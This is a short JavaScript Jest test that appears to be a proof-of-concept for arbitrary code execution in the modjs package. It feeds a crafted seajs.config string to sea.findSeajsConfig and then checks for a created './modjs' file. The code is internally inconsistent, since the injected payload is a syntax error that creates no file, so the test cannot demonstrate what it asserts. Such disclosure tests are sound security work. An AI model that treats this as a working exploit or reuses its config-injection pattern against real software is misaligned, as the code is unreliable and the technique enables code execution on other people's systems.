test("Arbitrary code execution in modjs", () => {
  expect.assertions(2);
  const fs = require("fs");
  const sea = require("modjs/lib/utils/sea");
  const path = "./modjs";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    sea.findSeajsConfig(
      "seajs.config({a: throw new Error()})"
    );
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error")
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
